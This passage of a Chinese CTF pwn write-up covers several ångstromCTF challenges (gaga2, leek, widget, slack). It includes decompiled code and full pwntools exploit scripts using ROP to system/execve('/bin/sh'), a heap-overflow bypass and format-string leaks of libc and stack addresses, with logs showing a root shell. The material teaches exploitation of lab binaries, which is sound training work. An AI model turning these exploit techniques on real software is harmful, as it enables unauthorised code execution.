+sla(&quot;Your input: &quot;, payload)
+printf_addr = u64(rlf().ljust(8, b&quot;\x00&quot;)) # 接收puts打印出的printf函数
+leak(&quot;printf addr&quot;, printf_addr)
+
+libc_addr = printf_addr - libc.symbols[&quot;printf&quot;]
+libc.address = libc_addr # 将计算结果赋值给libc对象的address，这样后面算/bin/sh的地址的时候就不用再加基址了
+leak(&quot;libc addr&quot;, libc.address)
+
+# step2: rop，将main函数的ret覆盖成system(&quot;/bin/sh&quot;)
+rop2 = ROP(libc)
+# find_gadget(instructions): Returns a gadget with the exact sequence of instructions specified in the instructions argument.
+# raw(value): Adds a raw integer or string to the ROP chain. If your architecture requires aligned values, then make sure that any given string is aligned!
+rop2.raw(rop2.find_gadget([&quot;ret&quot;])) # 【注意2】ubuntu18开始，执行system函数需要栈对齐（16字节对齐），我先试了不加这条指令，是没有对齐的，所以这里加一条ret指令，令栈对齐
+rop2.system(next(libc.search(b&quot;/bin/sh&quot;)))
+print(rop2.dump())
+payload2 = b'a'*0x48 + rop2.chain()
+sla(&quot;Your input: &quot;, payload2)
+
+itr()
+</code></pre>
+<p>结果如下：</p>
+<pre><code class="language-shell">root@e289eaa0da06:/chal# python3 exp2.py
+[*] '/chal/gaga2'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Starting local process './gaga2' argv=[b'./gaga2'] : pid 394
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Loaded 14 cached gadgets for './gaga2'
+0x0000:         0x4012b3 pop rdi; ret
+0x0008:         0x404030 [arg0] rdi = got.printf
+0x0010:         0x401094 puts
+0x0018:         0x4011d6 main()
+[DEBUG] Received 0x44 bytes:
+    b&quot;Awesome! Now there's no system(), so what will you do?!\n&quot;
+    b'Your input: '
+[DEBUG] Sent 0x69 bytes:
+    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
+    *
+    00000040  61 61 61 61  61 61 61 61  b3 12 40 00  00 00 00 00  │aaaa│aaaa│··@·│····│
+    00000050  30 40 40 00  00 00 00 00  94 10 40 00  00 00 00 00  │0@@·│····│··@·│····│
+    00000060  d6 11 40 00  00 00 00 00  0a                        │··@·│····│·│
+    00000069
+[DEBUG] Received 0x4b bytes:
+    00000000  70 e7 e7 9e  19 7f 0a 41  77 65 73 6f  6d 65 21 20  │p···│···A│weso│me! │
+    00000010  4e 6f 77 20  74 68 65 72  65 27 73 20  6e 6f 20 73  │Now │ther│e's │no s│
+    00000020  79 73 74 65  6d 28 29 2c  20 73 6f 20  77 68 61 74  │yste│m(),│ so │what│
+    00000030  20 77 69 6c  6c 20 79 6f  75 20 64 6f  3f 21 0a 59  │ wil│l yo│u do│?!·Y│
+    00000040  6f 75 72 20  69 6e 70 75  74 3a 20                  │our │inpu│t: │
+    0000004b
+[+] printf addr = 0x7f199ee7e770
+[+] libc addr = 0x7f199ee1e000
+[*] Loaded 218 cached gadgets for '/lib/x86_64-linux-gnu/libc.so.6'
+0x0000:   0x7f199ee47cd6 ret
+0x0008:   0x7f199ee483e5 pop rdi; ret
+0x0010:   0x7f199eff6698 [arg0] rdi = 139748018448024
+0x0018:   0x7f199ee6ed60 system
+[DEBUG] Sent 0x69 bytes:
+    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
+    *
+    00000040  61 61 61 61  61 61 61 61  d6 7c e4 9e  19 7f 00 00  │aaaa│aaaa│·|··│····│
+    00000050  e5 83 e4 9e  19 7f 00 00  98 66 ff 9e  19 7f 00 00  │····│····│·f··│····│
+    00000060  60 ed e6 9e  19 7f 00 00  0a                        │`···│····│·│
+    00000069
+[*] Switching to interactive mode
+$ id
+[DEBUG] Sent 0x3 bytes:
+    b'id\n'
+[DEBUG] Received 0x27 bytes:
+    b'uid=0(root) gid=0(root) groups=0(root)\n'
+uid=0(root) gid=0(root) groups=0(root)
+$ cat flag.txt
+[DEBUG] Sent 0xd bytes:
+    b'cat flag.txt\n'
+[DEBUG] Received 0x11 bytes:
+    b'flag{aaaaaaaaaa}\n'
+flag{aaaaaaaaaa}
+$
+</code></pre>
+<h2 id="23-调试">2.3 调试</h2>
+<p>以前都是在虚拟机里做题，如果调试，直接<code>gdb.attach(p)</code>就ok了。现在在docker里调试，步骤如下：</p>
+<p>1、进入tmux</p>
+<p>2、python脚本：<code>context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']</code></p>
+<p>3、python脚本：<code>gdb.attach(p)</code></p>
+<p>4、执行python脚本</p>
+<blockquote>
+<p><code>pwnlib.gdb.attach(target, gdbscript='', exe=None, gdb_args=None, ssh=None, sysroot=None, api=False)</code></p>
+<p><a href="https://docs.pwntools.com/en/stable/gdb.html#pwnlib.gdb.attach">pwnlib.gdb.attach - API介绍</a></p>
+</blockquote>
+<p>计算栈中变量距离<code>ret</code>可用两个API：<code>cyclic(num)</code>和<code>cyclic_find(string)</code>。</p>
+<p>最终还是调了一下<code>gaga0</code>：</p>
+<pre><code class="language-python">sla(&quot;Your input: &quot;, cyclic(0x100))
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230709023030.png" alt="" loading="lazy"></figure>
+<p>可以看到main函数的返回地址被覆盖成了<code>0x6161617461616173</code>，对应的字符是：<code>saaataaa</code>。</p>
+<pre><code class="language-python">offset = cyclic_find(&quot;saaa&quot;)
+logsucc(hex(offset))
+</code></pre>
+<p>打印结果看到是0x48</p>
+<pre><code class="language-shell">root@870aeb6e392e:/chal# python3 exp0.py
+......
+[+] 0x48
+......
+</code></pre>
+<h1 id="3-leek">3 leek</h1>
+<p>Dockerfile如下：</p>
+<pre><code class="language-dockerfile">FROM pwn.red/jail
+
+COPY --from=ubuntu:22.04 / /srv
+COPY leek /srv/app/run
+COPY flag.txt /srv/app/flag.txt
+RUN chmod 755 /srv/app/run
+</code></pre>
+<p>该程序运行在Ubuntu22环境中，同时又有flag.txt。</p>
+<h2 id="31-运行">3.1 运行</h2>
+<pre><code class="language-shell">root@3d0b9610b107:/chal# ./leek
+I dare you to leek my secret.
+Your input (NO STACK BUFFER OVERFLOWS!!): hello
+:skull::skull::skull: bro really said: hello
+
+So? What's my secret? aaa
+Wrong!
+
+root@3d0b9610b107:/chal# checksec leek
+[*] '/chal/leek'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<p>开启了Canary和NX，PIE是关闭的。</p>
+<h2 id="32-反编译">3.2 反编译</h2>
+<p>简单扫几眼main函数，最后调用win函数，点进去一看，功能是打印flag:)。所以大概就是让想办法使程序能走到最后。首先找前面有没有程序结束点，其他看注释吧。</p>
+<ul>
+<li>main</li>
+</ul>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  unsigned int v3; // eax
+  int i; // [rsp+0h] [rbp-50h]
+  int j; // [rsp+4h] [rbp-4Ch]
+  __gid_t rgid; // [rsp+8h] [rbp-48h]
+  char *v9; // [rsp+10h] [rbp-40h]
+  void *s; // [rsp+18h] [rbp-38h]
+  char s2[40]; // [rsp+20h] [rbp-30h] BYREF
+  unsigned __int64 v12; // [rsp+48h] [rbp-8h]
+
+  v12 = __readfsqword(0x28u);
+  v3 = time(0LL);
+  srand(v3);
+  setbuf(stdout, 0LL);
+  setbuf(stdin, 0LL);
+  rgid = getegid();
+  setresgid(rgid, rgid, rgid);
+  puts(&quot;I dare you to leek my secret.&quot;);
+  for ( i = 0; i &lt; N; ++i )                     // 【12】循环100次
+  {
+    v9 = (char *)malloc(0x10uLL);
+    s = malloc(0x20uLL);                        // 【4】s是分配的堆块
+    memset(s, 0, 0x20uLL);
+    getrandom(s, 32LL, 0LL);                    // 【5】s填充为随机数
+    for ( j = 0; j &lt;= 31; ++j )
+    {
+      if ( !*((_BYTE *)s + j) || *((_BYTE *)s + j) == 10 )// 【6】如果s中有NULL或者回车符，则将其替换为数字1
+        *((_BYTE *)s + j) = 1;
+    }
+    printf(&quot;Your input (NO STACK BUFFER OVERFLOWS!!): &quot;);
+    input(v9);                                  // 【7】v9是内容大小为0x10的chunk，然后传入input函数存储输入
+    printf(&quot;:skull::skull::skull: bro really said: &quot;);
+    puts(v9);                                   // 【10】打印v9
+    printf(&quot;So? What's my secret? &quot;);
+    fgets(s2, 33, stdin);                       // 【3】s2是输入（0x21 Byte）
+    if ( strncmp((const char *)s, s2, 0x20uLL) )// 【2】要让s和s2的前0x20字节相等
+    {
+      puts(&quot;Wrong!&quot;);                           // 【1】不能让程序走到这里
+      exit(-1);
+    }
+    puts(&quot;Okay, I'll give you a reward for guessing it.&quot;);
+    printf(&quot;Say what you want: &quot;);
+    gets(v9);                                   // 【11】再次往v9输入，也可以溢出
+    puts(&quot;Hmm... I changed my mind.&quot;);
+    free(s);
+    free(v9);
+    puts(&quot;Next round!&quot;);
+  }
+  puts(&quot;Looks like you made it through.&quot;);
+  win();
+  return v12 - __readfsqword(0x28u);
+}
+</code></pre>
+<ul>
+<li>input</li>
+</ul>
+<pre><code class="language-c">unsigned __int64 __fastcall input(void *input_buffer1)
+{
+  size_t v1; // rax
+  char s[1288]; // [rsp+10h] [rbp-510h] BYREF
+  unsigned __int64 v4; // [rsp+518h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  fgets(s, 1280, stdin);                        // 【8】往1288大小的s中输入数据
+  v1 = strlen(s);
+  memcpy(input_buffer1, s, v1);                 // 【9】将输入拷贝到传入的input_buffer中，也就是main函数中的v9，这会导致v9堆溢出
+  return v4 - __readfsqword(0x28u);
+}
+</code></pre>
+<ul>
+<li>win</li>
+</ul>
+<pre><code class="language-c">unsigned __int64 win()
+{
+  FILE *stream; // [rsp+8h] [rbp-98h]
+  char s[136]; // [rsp+10h] [rbp-90h] BYREF
+  unsigned __int64 v3; // [rsp+98h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
+  if ( !stream )
+  {
+    puts(&quot;Error: missing flag.txt.&quot;);
+    exit(1);
+  }
+  fgets(s, 128, stream);
+  puts(s);
+  return v3 - __readfsqword(0x28u);
+}
+</code></pre>
+<p>看完代码，思路就清晰了：s和v9都指向堆块，两chunk连续，且v9在s上方（地址更低）。很明显，绕过if判断有两种方法：1）利用溢出修改chunk s，然后输入s2的时候溢出的内容；2）利用溢出泄露chunk s的内容，然后输入s2的时候输入泄露的内容。</p>
+<p>if判断之后还有一次输入，这次输入能随意？不行，需要利用这次输入修复chunk s的size，不然执行到free的时候你就会发现，ptmalloc2会检查chunk的size：打印<code>double free or corruption (out)</code>，并导致程序退出。注意循环100次。</p>
+<h2 id="33-exp">3.3 exp</h2>
+<pre><code class="language-python">from pwn import *
+import warnings
+
+warnings.filterwarnings(action='ignore', category=BytesWarning)
+
+s       = lambda data               :p.send(data)
+sa      = lambda delim,data         :p.sendafter(delim, data)
+sl      = lambda data               :p.sendline(data)
+sla     = lambda delim,data         :p.sendlineafter(delim, data)
+r       = lambda num=4096           :p.recv(num)
+ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
+ruf     = lambda delims, drop=False :p.recvuntil(delims, drop)
+rl      = lambda drop=True          :p.recvline(drop)
+rlf     = lambda drop=False         :p.recvline(drop)
+uu64    = lambda data               :u64(data.ljust(8,'\x00'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+logsucc = lambda info               :log.success(info)
+itr     = lambda                    :p.interactive()
+
+context.clear(arch='amd64') # 【注意1】加上架构信息，不然rop模块会把该程序当成32位程序
+context.log_level = 'DEBUG'
+#context.terminal=['tmux', 'spilit-window', '-h']
+context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
+
+def dbg():
+    gdb.attach(p)
+    # pause()
+
+elf = ELF(&quot;./leek&quot;)
+p = process(&quot;./leek&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+
+for i in range(100):
+    # method1
+    payload = b'a'*(0x20) + b'z'*0x20
+    sla(&quot;): &quot;, payload)
+    # dbg()
+    # 下面这里不能使用sla，而需要使用sa。
+    # 如果用sla，那么输入的字符串长度就是0x22了，即最后两个字符是\n\x00，把前0x21个字符给s2后，缓冲区里还剩1个\x00
+    # 那么后面执行gets(v9)的时候，从stdin输入的第一个字符就是\x00，那就不能再修复chunk 的size字段了
+    sa(&quot;secret? &quot;, b'z'*0x20)
+    sla(&quot;want: &quot;,b'a'*0x18 + p64(0x31))
+
+
+    # method2
+    # payload = b'a'*(0x20-1) # 减1是留空间给\n，这样刚好填满chunk s的prev_size和size字段
+    # sla(&quot;): &quot;, payload)
+    # ru(&quot;\n&quot;) # 接收刚刚输入的内容
+    # leak = r(0x20) # 接收chunk s中的随机数
+    # print(leak)
+    # sa(&quot;secret? &quot;, leak) 
+    # sla(&quot;want: &quot;, b'b'*0x18 + p64(0x31))
+
+itr()
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230716182712.png" alt="image-20230712015632607" loading="lazy"></figure>
+<h1 id="4-widget">4 widget</h1>
+<blockquote>
+<p>I seem to have lost my gadgets.</p>
+</blockquote>
+<h2 id="41-运行">4.1 运行</h2>
+<p>关闭了Canary（栈溢出覆盖ret简单多了）和PIE（不用泄露地址了），开启了NX。</p>
+<pre><code class="language-shell">root@5289895e8b8a:/chal# ./widget
+Amount: 12
+Contents: 2344
+Your input: 2344
+
+root@5289895e8b8a:/chal# checksec widget
+[*] '/chal/widget'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<h2 id="42-反编译">4.2 反编译</h2>
+<p>函数列表里又有win函数。</p>
+<ul>
+<li>main</li>
+</ul>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int amount; // [rsp+Ch] [rbp-24h] BYREF
+  char buf[24]; // [rsp+10h] [rbp-20h] BYREF     buf距离rbp 0x20
+  __gid_t rgid; // [rsp+28h] [rbp-8h]
+  unsigned int i; // [rsp+2Ch] [rbp-4h]
+
+  setbuf(_bss_start, 0LL);
+  setbuf(stdin, 0LL);
+  rgid = getegid();
+  setresgid(rgid, rgid, rgid);
+  if ( called )
+    exit(1);
+  called = 1;                                   // 这个变量使得main函数只允许执行一次
+  printf(&quot;Amount: &quot;);
+  amount = 0;
+  __isoc99_scanf(&quot;%d&quot;, &amp;amount);                // 输入amount
+  getchar();
+  if ( amount &lt; 0 )                             // amount需要&gt;=0
+    exit(1);
+  printf(&quot;Contents: &quot;);
+  read(0, buf, amount);                         // 读取amount长度的数据到buf
+  for ( i = 0; (int)i &lt; amount; ++i )
+  {
+    if ( buf[i] == 'n' )                        // amount长度的buf里不能含有n这个字符
+    {
+      printf(&quot;bad %d\n&quot;, i);
+      exit(1);
+    }
+  }
+  printf(&quot;Your input: &quot;);
+  return printf(buf);                           // 格式化字符串漏洞
+}
+</code></pre>
+<ul>
+<li>win</li>
+</ul>
+<pre><code class="language-c">int __fastcall win(const char *a1, const char *a2)
+{
+  char s[136]; // [rsp+10h] [rbp-90h] BYREF
+  FILE *stream; // [rsp+98h] [rbp-8h]
+
+  if ( strncmp(a1, &quot;14571414c5d9fe9ed0698ef21065d8a6&quot;, 0x20uLL) )// 第一个参数需要等于这个字符串
+    exit(1);
+  if ( strncmp(a2, &quot;willy_wonka_widget_factory&quot;, 0x1AuLL) )// 第二个参数需要等于这个字符串
+    exit(1);
+  stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);              // 打印flag.txt内容。一样，可以尝试直接跳转到这里来绕过前面的if判断
+  if ( !stream )
+  {
+    puts(&quot;Error: missing flag.txt.&quot;);
+    exit(1);
+  }
+  fgets(s, 128, stream);
+  return puts(s);
+}
+</code></pre>
+<p>理一理思路：</p>
+<p>1、利用栈溢出覆盖main函数的ret为win函数中开始读<code>flag.txt</code>的地方。</p>
+<p>2、看看读flag.txt的地方会不会使用到rbp，如下面的代码，是会的。</p>
+<pre><code class="language-assembly">.text:000000000040130B loc_40130B:                             ; CODE XREF: win+69↑j
+.text:000000000040130B                 lea     rax, modes      ; &quot;r&quot;
+.text:0000000000401312                 mov     rsi, rax        ; modes
+.text:0000000000401315                 lea     rax, filename   ; &quot;flag.txt&quot;
+.text:000000000040131C                 mov     rdi, rax        ; filename
+.text:000000000040131F                 call    _fopen
+.text:0000000000401324                 mov     [rbp+stream], rax
+.text:0000000000401328                 cmp     [rbp+stream], 0
+</code></pre>
+<p>找个可读可写的地址：</p>
+<pre><code class="language-shell">pwndbg&gt; vmmap
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+             Start                End Perm     Size Offset File
+......
+          0x404000           0x405000 rw-p     1000   3000 /chal/widget
+</code></pre>
+<p>这个过程中没有其他阻碍了，非常简单，格式化字符串漏洞也没用到。exp如下。</p>
+<h2 id="43-exp">4.3 exp</h2>
+<pre><code class="language-python">from pwn import *
+import warnings
+import subprocess
+
+warnings.filterwarnings(action='ignore', category=BytesWarning)
+
+s       = lambda data               :p.send(data)
+sa      = lambda delim,data         :p.sendafter(delim, data)
+sl      = lambda data               :p.sendline(data)
+sla     = lambda delim,data         :p.sendlineafter(delim, data)
+r       = lambda num=4096           :p.recv(num)
+ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
+ruf     = lambda delims, drop=False :p.recvuntil(delims, drop)
+rl      = lambda drop=True          :p.recvline(drop)
+rlf     = lambda drop=False         :p.recvline(drop)
+uu64    = lambda data               :u64(data.ljust(8,'\x00'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+logsucc = lambda info               :log.success(info)
+itr     = lambda                    :p.interactive()
+
+context.clear(arch='amd64') # 【注意1】加上架构信息，不然rop模块会把该程序当成32位程序
+context.log_level = 'DEBUG'
+#context.terminal=['tmux', 'spilit-window', '-h']
+context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
+
+def dbg():
+    gdb.attach(p)
+    # pause()
+
+elf = ELF(&quot;./widget&quot;)
+p = process(&quot;./widget&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+
+# p = remote(&quot;&quot;,&quot;&quot;)
+# ru(&quot;proof of work: &quot;)
+# pow = rl()
+# sla(&quot;solution: &quot;, subprocess.check_output(pow, shell=True, text=True))
+
+sla(b&quot;Amount: &quot;,str(0x30)) # 这个值其实只要够大就可以
+payload = b'a'* 0x20  + p64(0x404500) + p64(0x40130B)
+sla(&quot;Contents: &quot;, payload)
+
+itr()
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230713005825.png" alt="image-20230712233109988" loading="lazy"></figure>
+<blockquote>
+<p>这道题用到了<code>proof of work</code>，在上面 exp 的注释中记录了相应的接收发送代码。</p>
+</blockquote>
+<h2 id="44-exp2">4.4 exp2</h2>
+<p>还有另一种解法，第一次溢出的时候，利用格式化字符串漏洞泄漏libc地址，然后ret覆盖为<code>printf(&quot;Amount: &quot;);</code>的地址，绕过<code>called</code>的限制；第二次溢出的时候，ret覆盖为rop链地址，拿到shell，最后<code>cat flag.txt</code>。</p>
+<pre><code class="language-assembly">.text:00000000004013D9 loc_4013D9:                             ; CODE XREF: main+5B↑j &lt;-- 第一次溢出ret选这个地址
+.text:00000000004013D9                 mov     cs:called, 1
+.text:00000000004013E3                 lea     rax, format     ; &quot;Amount: &quot;
+.text:00000000004013EA                 mov     rdi, rax        ; format
+.text:00000000004013ED                 mov     eax, 0
+.text:00000000004013F2                 call    _printf
+</code></pre>
+<p>这有个问题，libc地址怎么泄漏？栈里应该有libc的地址，那么利用格式化字符串漏洞可以泄漏出来。而且这个地址应该和libc基址的偏移应该是不变的。于是，通过gdb计算出这个偏移，然后泄漏出地址，再一算就能拿到libc基址了。</p>
+<figure data-type="image" tabindex="7"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230713005557.png" alt="image-20230713005554605" loading="lazy"></figure>
+<p>所以，偏移是<code>0x7ff82fb37a37 - 0x7ff82fa23000</code></p>
+<p>exp如下：</p>
+<pre><code class="language-python">from pwn import *
+import warnings
+import subprocess
+
+warnings.filterwarnings(action='ignore', category=BytesWarning)
+
+s       = lambda data               :p.send(data)
+sa      = lambda delim,data         :p.sendafter(delim, data)
+sl      = lambda data               :p.sendline(data)
+sla     = lambda delim,data         :p.sendlineafter(delim, data)
+r       = lambda num=4096           :p.recv(num)
+ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
+ruf     = lambda delims, drop=False :p.recvuntil(delims, drop)
+rl      = lambda drop=True          :p.recvline(drop)
+rlf     = lambda drop=False         :p.recvline(drop)
+uu64    = lambda data               :u64(data.ljust(8,'\x00'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+logsucc = lambda info               :log.success(info)
+itr     = lambda                    :p.interactive()
+
+context.clear(arch='amd64') # 【注意】加上架构信息，不然rop模块会把该程序当成32位程序
+context.log_level = 'DEBUG'
+#context.terminal=['tmux', 'spilit-window', '-h']
+context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
+
+def dbg():
+    gdb.attach(p)
+    # pause()
+
+elf = ELF(&quot;./widget&quot;)
+p = process(&quot;./widget&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+
+# p = remote(&quot;&quot;,&quot;&quot;)
+# ru(&quot;proof of work: &quot;)
+# pow = rl()
+# sla(&quot;solution: &quot;, subprocess.check_output(pow, shell=True, text=True))
+
+# step1: leak libc base address
+sla(b&quot;Amount: &quot;,str(0x30)) # 这个值其实只要够大就可以
+# 4个字符 * 6 + 8个随意字符 + rbp + ret
+payload = b'%p  '* 6  + b'xxxxxxxx' + p64(0x404500)+ p64(0x4013D9) #p64(0x4013E3)
+sla(&quot;Contents: &quot;, payload)
+ru(&quot;Your input: &quot;)
+leak_data = ru(&quot;xxxx&quot;).decode()
+leak_data_list = leak_data.split(&quot;  &quot;)
+print(leak_data_list)
+leak_libc_addr = int(leak_data_list[2],16)
+leak(&quot;libc_some_addr&quot;, leak_libc_addr)
+libc.address = leak_libc_addr - (0x7ff82fb37a37 - 0x7ff82fa23000)
+leak(&quot;libc_base_addr&quot;, libc.address)
+# dbg()
+
+
+# step2: rop
+rop = ROP(libc)
+# rop.raw(rop.find_gadget([&quot;ret&quot;]))  # 用system gadget失败了，原因待分析，不过做题的时候不用管，哪个不行就换另一个
+# rop.system(next(libc.search(b&quot;/bin/sh&quot;)))
+#### execve(&quot;/bin/sh&quot;, 0, 0)
+rop.execve(next(libc.search(b&quot;/bin/sh&quot;)), 0, 0)
+print(rop.dump())
+
+sla(b&quot;Amount: &quot;,str(0x100)) # 这次写大点
+payload = b'a'* 0x20 + p64(0x404500) + rop.chain()
+sla(&quot;Contents: &quot;, payload)
+itr()
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230713005818.png" alt="image-20230713005815729" loading="lazy"></figure>
+<h1 id="5-slack">5 slack</h1>
+<blockquote>
+<p>Join the ångstromCTF slack!</p>
+</blockquote>
+<p>该题运行在Ubuntu22的环境中</p>
+<pre><code class="language-dockerfile">FROM pwn.red/jail
+
+COPY --from=ubuntu:22.04 / /srv
+COPY slack /srv/app/run
+COPY flag.txt /srv/app/flag.txt
+RUN chmod 755 /srv/app/run
+</code></pre>
+<h2 id="51-运行">5.1 运行</h2>
+<p>这是模拟一个聊天软件？有一个机器人提醒你一些事情？有三次输入的机会。保护全开。</p>
+<pre><code class="language-shell">root@8edd47208f9e:/chal# ./slack
+Welcome to slack (not to be confused with the popular chat service Slack)!
+2023-07-13 15:46:16 -- slack Bot:  Hi there! Just wanted to remind you that your weekly team meeting starts in 10 minutes.
+Your message (to increase character limit, pay $99 to upgrade to Professional): aaaa
+2023-07-13 15:46:16 -- You: aaaa
+
+2023-07-13 15:46:16 -- slack Bot:  Don't forget to fill out your time sheet for the week by 5 pm today.
+Your message (to increase character limit, pay $99 to upgrade to Professional): aaaa
+2023-07-13 15:46:16 -- You: aaaa
+
+2023-07-13 15:46:16 -- slack Bot:  Just a heads up - the office will be closed on Friday for a company-wide retreat.
+Your message (to increase character limit, pay $99 to upgrade to Professional): aaaa
+2023-07-13 15:46:16 -- You: aaaa
+
+
+root@8edd47208f9e:/chal# checksec slack
+[*] '/chal/slack'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre>
+<h2 id="52-反编译">5.2 反编译</h2>
+<p>循环3次，每次都能触发同一个格式化字符串漏洞。</p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  unsigned int v3; // eax
+  int v4; // eax
+  int i; // [rsp+8h] [rbp-68h]
+  __gid_t rgid; // [rsp+Ch] [rbp-64h]
+  time_t timer; // [rsp+10h] [rbp-60h] BYREF
+  struct tm *tp; // [rsp+18h] [rbp-58h]
+  char s[32]; // [rsp+20h] [rbp-50h] BYREF
+  char format[40]; // [rsp+40h] [rbp-30h] BYREF
+  unsigned __int64 v13; // [rsp+68h] [rbp-8h]
+
+  v13 = __readfsqword(0x28u);
+  setbuf(_bss_start, 0LL);
+  setbuf(stdin, 0LL);
+  rgid = getegid();
+  setresgid(rgid, rgid, rgid);
+  puts(&quot;Welcome to slack (not to be confused with the popular chat service Slack)!&quot;);
+  timer = time(0LL);
+  tp = localtime(&amp;timer);
+  v3 = time(0LL);
+  srand(v3);
+  for ( i = 0; i &lt;= 2; ++i )                      // 循环3次
+  {
+    strftime(s, 0x1AuLL, &quot;%Y-%m-%d %H:%M:%S&quot;, tp);// 生成时间字符串
+    v4 = rand();
+    printf(&quot;%s -- slack Bot:  %s\n&quot;, s, (&amp;messages)[v4 % 8]);// 随机打印messages里的句子，里面有8句
+    printf(&quot;Your message (to increase character limit, pay $99 to upgrade to Professional): &quot;);
+    fgets(format, 14, stdin);                   // 输入数据到format，最多14Byte
+    tp = localtime(&amp;timer);
+    strftime(s, 0x1AuLL, &quot;%Y-%m-%d %H:%M:%S&quot;, tp);// 再次生成时间字符串
+    printf(&quot;%s -- You: &quot;, s);
+    printf(format);                             // 打印前面输入的format。格式化字符串漏洞
+    putchar(10);                                // 打印换行
+  }
+  return v13 - __readfsqword(0x28u);
+}
+</code></pre>
+<p>保护全开，这里也只有格式化字符串漏洞，那就只能想办法覆盖ret了。</p>
+<p>1）覆写ret，那首先需要泄漏出栈里存放ret的地址</p>
+<p>2）然后，覆盖为rop链的地址，那还需要泄漏出libc基址</p>
+<p>所以总体思路：</p>
+<p>1）泄漏栈和libc的地址</p>
+<p>2）覆写ret为rop链的地址</p>
+<h2 id="53-调试">5.3 调试</h2>
+<h3 id="531-泄露栈地址和libc地址">5.3.1 泄露栈地址和libc地址</h3>
+<p>首先，想要通过格式化字符串漏洞泄露栈上的内容，一般都会在输入时敲很多<code>%p</code>，但是注意，这里的每次输入最多14Byte。所以为了方便查看结果，以及不用敲那么多次输入，用脚本：</p>
+<pre><code class="language-python">from pwn import *
+import warnings
+import subprocess
+
+warnings.filterwarnings(action='ignore', category=BytesWarning)
+
+s       = lambda data               :p.send(data)
+sa      = lambda delim,data         :p.sendafter(delim, data)
+sl      = lambda data               :p.sendline(data)
+sla     = lambda delim,data         :p.sendlineafter(delim, data)
+r       = lambda num=4096           :p.recv(num)
+ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
+ruf     = lambda delims, drop=False :p.recvuntil(delims, drop)
+rl      = lambda drop=True          :p.recvline(drop)
+rlf     = lambda drop=False         :p.recvline(drop)
+uu64    = lambda data               :u64(data.ljust(8,'\x00'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+logsucc = lambda info               :log.success(info)
+itr     = lambda                    :p.interactive()
+
+context.clear(arch='amd64')
+# context.log_level = 'DEBUG'
+context.log_level = 'CRITICAL'
+#context.terminal=['tmux', 'spilit-window', '-h']
+context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
+
+def dbg():
+    gdb.attach(p)
+    # pause()
+
+elf = ELF(&quot;./slack&quot;)
+# p = process(&quot;./slack&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+
+# 循环16次，打印%i$p
+for i in range(0x10):
+    p = process(&quot;./slack&quot;)
+    sla(b&quot;): &quot;, f&quot;%{i}$p&quot;)
+    ru(&quot;You: &quot;)
+    data = rl().strip()
+    print(f&quot;{i=} {data=}&quot;)
+    p.close()
+</code></pre>
+<p>执行两次，结果如下：</p>
+<pre><code class="language-shell">root@8edd47208f9e:/chal# python3 exp.py
+i=0 data=b'%0$p'
+i=1 data=b'0x7fff6f4d5620'    &lt;--- 0x7ff -&gt; 栈地址
+i=2 data=b'(nil)'
+i=3 data=b'0x7fdc7e7b2a37'    &lt;--- 这个变化有点大
+i=4 data=b'0x1c'
+i=5 data=b'0x7fffffff'
+i=6 data=b'(nil)'
+i=7 data=b'(nil)'
+i=8 data=b'0x64b18516'
+i=9 data=b'0x7f654113a6a0'   &lt;--- 选这个来计算libc地址
+i=10 data=b'0x2d37302d33323032'
